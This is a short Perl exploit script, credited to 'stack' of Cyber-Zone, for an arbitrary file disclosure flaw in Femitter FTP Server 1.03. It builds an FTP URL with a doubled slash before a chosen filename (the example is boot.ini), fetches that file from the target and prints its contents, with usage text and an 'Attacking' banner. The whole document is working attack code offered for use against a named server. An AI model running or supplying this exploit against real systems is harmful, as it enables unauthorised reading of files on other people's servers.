#!/usr/bin/perl
# Femitter FTP Server 1.03 Arbitrary File Disclosure Exploit
# Like ftpdmin 0.96 the same exploit but here is work just with double slach not 1 :d xd
# By stack
# Cyber-Zone
 
use LWP::Simple;
use LWP::UserAgent;
 
if (@ARGV < 3) {
            print("Usage: $0 <url> <port> <filename> \n");
            print("TARGETS are\n ");
            print("Define full path with file name \n");
            print("Example FTP: perl $0 127.0.0.1 21 boot.ini \n");
            exit(1);
                    }
                    ($target, $port,$filename) = @ARGV;
        print("Femitter FTP Exploit : Coded by Stack!\n");
        print("Attacking $target on port $port!\n");
        print("FILENAME:  $filename\n");
      
        $temp="/" x 2;
         my $url= "ftp://". $target. ":" . $port .$temp . $filename;
            $content=get $url;
            print("\n FILE CONTENT STARTED");
            print("\n -----------------------------------\n");
            print("$content");
            print("\n -------------------------------------\n");


